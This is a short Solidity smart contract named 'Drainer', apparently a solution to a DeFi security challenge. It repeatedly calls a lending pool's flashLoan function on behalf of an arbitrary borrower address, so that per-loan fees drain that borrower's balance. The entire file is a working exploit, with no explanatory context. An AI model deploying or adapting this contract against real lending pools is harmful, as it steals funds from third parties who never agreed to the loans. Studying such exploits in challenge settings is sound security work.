pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract Drainer  {
    using SafeMath for uint256;
    using Address for address;

    address payable private pool;

    constructor(address payable poolAddress) public {
        pool = poolAddress;
    }

    function drain(address payable borrower, uint256 borrowAmount, uint iterate) external{
      for (uint i=0; i<iterate; i++) {
        (bool success, ) = pool.call(
            abi.encodeWithSignature(
                "flashLoan(address,uint256)",
                borrower,
                borrowAmount
            )
        );
      }
    }
}
